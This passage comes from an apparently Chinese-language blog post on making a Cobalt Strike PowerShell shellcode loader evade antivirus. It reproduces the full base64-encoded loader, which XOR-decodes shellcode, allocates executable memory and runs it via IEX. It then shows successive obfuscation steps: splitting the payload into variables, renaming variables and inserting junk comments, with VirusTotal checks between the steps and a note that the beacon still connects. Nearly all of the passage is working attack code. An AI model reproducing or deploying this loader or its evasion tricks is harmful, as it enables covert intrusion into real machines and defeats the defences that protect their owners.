FtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($AAA))</span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $bbb | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $bbb  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/23.png" alt="æˆªå›¾"></p>
<p><img src="/posts/adb63639/24.png" alt="æˆªå›¾"></p>
<p>ä¸Šä¼ åˆ°VT</p>
<p> <img src="/posts/adb63639/25.png" alt="æˆªå›¾"></p>
<p>å‘ç°æŸ¥æ€ç‡è¿˜æ˜¯è¾ƒé«˜ï¼Œç„¶åå¯ä»¥å·®åˆ†ä¸€äº›ä¸Šé¢çš„$AAAå˜é‡</p>
<p>æ¥ä¸‹æ¥å°†$AAAå˜é‡å°±éšä¾¿åˆ†æˆ4éƒ¨åˆ† ç„¶åå†æ‹¼æ¥èµ·æ¥çœ‹çœ‹VTä¸Šçš„æ•ˆæœ</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$AAA</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnNBbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="string">&#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3V&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span> = <span class="string">&#x27;uc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnN&#x27;</span></span><br><span class="line"><span class="variable">$p3</span> = <span class="string">&#x27;Bbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZX&#x27;</span></span><br><span class="line"><span class="variable">$p4</span> = <span class="string">&#x27;RfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($AAA))</span></span><br><span class="line"><span class="variable">$bbb</span>= [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$p1</span>+<span class="variable">$p2</span>+<span class="variable">$p3</span>+<span class="variable">$p4</span>))</span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$bbb</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$bbb</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä¸Šçº¿CS</p>
<p><img src="/posts/adb63639/26.png" alt="æˆªå›¾"></p>
<p>åœ¨VTä¸Šæ²¡å•¥å˜åŒ– </p>
<p><img src="/posts/adb63639/27.png" alt="æˆªå›¾"></p>
<p>åœ¨è¿›è¡Œå˜æ¢è¯•è¯•</p>
<p>è¿™é‡Œä¸æ­¢å¯ä»¥ä½¿ç”¨base64 è¿˜å¯ä»¥å»ç”¨ AES å¼‚æˆ– ASCIIç­‰æ–¹å¼è¿›è¡ŒåŠ å¯† ä¹Ÿå¯ä»¥æ·»åŠ ä¸€äº›åƒåœ¾æ³¨é‡Šè¿›è¡Œå¹²æ‰°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wessda2mpdGd3R6w1da3RmhjTGMzMEt13G9rZShbSW50UHRyXTo6Wm5dasCM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo63r2sdaQycDFhbkYZlFvVVlHQ</span><br><span class="line">$a314fpda9 = &#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3V&#x27;</span><br><span class="line">#asdYyY0E1M1puQjNEbVZasdxYjJZ356dqqQ0Iyew4cas0lhd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQ</span><br><span class="line">$psdaadsas = &#x27;uc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnN&#x27;#adfijkhiu2y988hdcbnkjhiugsdaaslkh2eoiheiuoe2hncxxlknxc nvdh9802yuhiodhoahjieasssreshelsa1s</span><br><span class="line">$213rdsaf3 = 